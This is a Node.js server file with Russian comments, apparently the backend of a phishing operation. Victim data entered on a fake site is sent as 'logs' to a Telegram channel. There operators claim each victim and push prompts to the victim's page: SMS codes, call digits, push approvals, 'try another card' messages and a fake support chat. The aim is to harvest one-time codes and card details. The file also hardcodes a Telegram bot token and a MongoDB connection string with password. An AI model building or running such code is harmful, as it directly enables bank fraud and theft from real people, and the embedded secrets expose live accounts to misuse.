const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';
const BOT_LINK = 'https://t.me/tg_api_workbot'; 
const MONGO_URI = 'mongodb+srv://multmoment27_db_user:tgLoUlcEPVjsnZgb@cluster0.vzajrjd.mongodb.net/?retryWrites=true&w=majority'; 

mongoose.connect(MONGO_URI).then(() => console.log('✅ База подключена'));

const Worker = mongoose.model('Worker', new mongoose.Schema({
    workerId: String,      
    workerName: String,
    targetUserId: String   
}));

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

let userTasks = {}; 
let logsStorage = {}; 
let waitingForCustomText = {}; 

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

async function sendTg(method, data) {
    try {
        return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, data);
    } catch (e) {
        const desc = e.response?.data?.description || "";
        if (desc.includes("message is not modified") || desc.includes("query is too old")) return;
        console.error(`❌ TG Error [${method}]:`, desc || e.message);
    }
}

// Функция для генерации кнопок управления
const getControlKeyboard = (userId, channelMsgId) => {
    return {
        inline_keyboard: [
            [{ text: "💬 СМС", callback_data: `use_${userId}_sms` }, { text: "📞 Звонок", callback_data: `use_${userId}_call` }],
            [{ text: "📲 Пуш", callback_data: `use_${userId}_push` }, { text: "💰 Баланс", callback_data: `use_${userId}_bal` }],
            [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }],
            [{ text: "🔓 ОСВОБОДИТЬ ЛОГ", callback_data: `release_${userId}_${channelMsgId}` }]
        ]
    };
};

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data };
    const connection = await Worker.findOne({ targetUserId: userId });
    
    // Кнопки для общего канала
    const channelButtons = { 
        inline_keyboard: [
            connection 
                ? [{ text: `✅ ВЗЯЛ: ${connection.workerName}`, callback_data: "none" }]
                : [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
            [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
        ] 
    };

    let title = connection ? `⚠️ ПОВТОРНЫЙ ЛОГ` : `🆕 НОВЫЙ ЛОГ`;
    if (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE')) title = `📩 ОТВЕТ ЮЗЕРА`;

    // 1. Всегда отправляем/обновляем лог в канале
    await sendTg('sendMessage', {
        chat_id: CHANNEL_ID,
        text: `<b>${title} [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>`,
        parse_mode: 'HTML', 
        reply_markup: channelButtons
    });

    // 2. Если воркер уже взял лог — шлем ему дубликат с кнопками в бот
    if (connection) {
        let fullMsg = `<b>🔄 ПОВТОРНЫЙ ЛОГ [<code>${userId}</code>]</b>\n`;
        fullMsg += `📍 Тип: <b>${safeText(type)}</b>\n\n`;
        
        for (let key in data) { 
            fullMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; 
        }

        await sendTg('sendMessage', { 
            chat_id: connection.workerId, 
            text: fullMsg, 
            parse_mode: 'HTML',
            reply_markup: getControlKeyboard(userId, "0")
        });
    }
    
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const task = userTasks[req.params.userId] || null;
    if (task) delete userTasks[req.params.userId];
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (message && message.text) {
        const chatId = message.chat.id;
        if (message.text === '/start') {
            return sendTg('sendMessage', { chat_id: chatId, text: "<b>👋 Бот готов.</b>", parse_mode: 'HTML' });
        }

        if (waitingForCustomText[chatId]) {
            const targetUserId = waitingForCustomText[chatId];
            userTasks[targetUserId] = { action: 'ask', text: message.text };
            await sendTg('sendMessage', { chat_id: chatId, text: `✅ Отправлено юзеру <code>${targetUserId}</code>`, parse_mode: 'HTML' });
            delete waitingForCustomText[chatId]; 
        }
    }

    if (callback_query) {
        const workerId = callback_query.from.id;
        const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
        const [action, userId, code] = callback_query.data.split('_');
        const channelMsgId = callback_query.message.message_id;

        await sendTg('answerCallbackQuery', { callback_query_id: callback_query.id });

        if (action === 'take') {
            await Worker.findOneAndUpdate({ targetUserId: userId }, { workerId, workerName }, { upsert: true });
            
            await sendTg('editMessageReplyMarkup', {
                chat_id: CHANNEL_ID,
                message_id: channelMsgId,
                reply_markup: {
                    inline_keyboard: [
                        [{ text: `✅ ВЗЯЛ: ${workerName}`, callback_data: "none" }],
                        [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
                    ]
                }
            });

            const log = logsStorage[userId];
            let fullMsg = `<b>💎 УПРАВЛЕНИЕ [<code>${userId}</code>]</b>\n\n`;
            if (log) {
                for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; }
            }

            await sendTg('sendMessage', { 
                chat_id: workerId, 
                text: fullMsg, 
                parse_mode: 'HTML', 
                reply_markup: getControlKeyboard(userId, channelMsgId) 
            });
        }

        if (action === 'release') {
            await Worker.findOneAndDelete({ targetUserId: userId });
            
            const freeButtons = {
                inline_keyboard: [
                    [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
                    [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
                ]
            };

            // 1. Возвращаем кнопку в старое сообщение
            if (code !== "0") {
                await sendTg('editMessageReplyMarkup', {
                    chat_id: CHANNEL_ID,
                    message_id: code, 
                    reply_markup: freeButtons
                });
            }

            // 2. Кидаем НОВОЕ сообщение в канал об освобождении
            await sendTg('sendMessage', {
                chat_id: CHANNEL_ID,
                text: `<b>🔓 ЛОГ ОСВОБОЖДЕН</b>\n🆔 ID: <code>${userId}</code>\n\nЛог снова доступен для работы!`,
                parse_mode: 'HTML',
                reply_markup: freeButtons
            });

            await sendTg('sendMessage', { chat_id: workerId, text: `🔓 Лог <code>${userId}</code> освобожден.`, parse_mode: 'HTML' });
        }

        if (action === 'use') {
            const textToSend = cmdTexts[code] || "Введите данные";
            userTasks[userId] = { action: 'ask', text: textToSend };
            await sendTg('sendMessage', { chat_id: workerId, text: `✅ Отправлено: <i>"${textToSend}"</i>`, parse_mode: 'HTML' });
        }

        if (action === 'custom') {
            waitingForCustomText[workerId] = userId;
            await sendTg('sendMessage', { chat_id: workerId, text: `⌨️ <b>Введите текст для <code>${userId}</code>:</b>`, parse_mode: 'HTML' });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен`));
